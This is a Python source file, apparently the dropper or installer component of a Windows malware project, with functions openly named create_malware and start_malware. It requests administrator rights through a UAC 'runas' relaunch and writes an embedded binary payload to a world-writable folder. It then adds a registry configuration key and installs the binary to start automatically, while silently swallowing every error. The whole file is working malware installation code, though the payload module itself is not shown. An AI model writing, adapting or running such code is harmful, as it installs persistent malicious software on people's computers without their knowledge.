from local_libs import payload
from local_libs.winregistry import Registry
from local_libs.env_vars import *

from pathlib import Path
import ctypes
import sys
import os


def development_logging():
    log = open("logging.log", "a")
    sys.stderr = log


def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin()


def run_as_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)


def create_malware(path, binary_code):
    with open(path, "wb") as f:
        f.write(binary_code)


def setup_folder():
    new_binary_path = f"{MALWARE_PATH}/{PAYLOAD_FILENAME}.exe"

    if not os.path.exists(MALWARE_PATH):
        Path(MALWARE_PATH).mkdir(0o777, True, True)
        # os.mkdir(MALWARE_PATH)
        create_malware(new_binary_path, payload.payload())

    return new_binary_path


def setup_registry():
    Registry.create_key(REG_KEY)
    registry = Registry(REG_KEY)
    registry.set_value("config", DEFAULT_CONFIG)


def start_malware(path):
    os.system(f"{path} --startup=auto install")
    os.system(f"{path} start")


def main():
    if is_admin() == 0:
        run_as_admin()

    malware_path = setup_folder()
    setup_registry()

    start_malware(malware_path)


if __name__ == "__main__":
    try:
        main()
    except:
        pass
